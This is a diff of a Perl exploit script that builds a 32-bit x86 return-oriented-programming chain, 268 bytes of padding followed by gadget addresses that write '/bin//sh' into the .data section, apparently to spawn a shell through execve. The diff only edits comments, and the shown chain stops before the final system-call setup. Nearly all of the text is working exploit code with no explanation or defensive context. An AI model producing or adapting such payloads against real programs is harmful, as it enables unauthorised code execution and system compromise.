@@ -2,7 +2,6 @@
 use strict;
 
 my $p = "a" x 268;
-# execve /bin/sh
 
 $p .= pack("I", 0x08053eac); # pop %edx | ret
 $p .= "/bin";
@@ -11,7 +10,7 @@ $p .= pack("I", 0x080aa9a7); # mov %edx,%eax | ret
 $p .= pack("I", 0x08053eac); # pop %edx | ret
 $p .= pack("I", 0x080cf020); # @ .data
 $p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
-#data = /bin
+#.data = /bin
 
 $p .= pack("I", 0x08053eac); # pop %edx | ret
 $p .= "//sh";
@@ -21,13 +20,13 @@ $p .= pack("I", 0x080aa9a7); # mov %edx,%eax | ret
 $p .= pack("I", 0x08053eac); # pop %edx | ret
 $p .= pack("I", 0x080cf024); # @ .data + 4
 $p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
-#data = /bin//sh
+#.data = /bin//sh
 
 $p .= pack("I", 0x08053eac); # pop %edx | ret
 $p .= pack("I", 0x080cf028); # @ .data + 8
 $p .= pack("I", 0x0809d40f); # xor %eax,%eax | ret
 $p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
-#data = /bin//sh\0
+#.data = /bin//sh\0
 
 $p .= pack("I", 0x08053ed6); #pop %ecx | pop %ebx | ret
 $p .= pack("I", 0x080cf028); # @ .data + 8
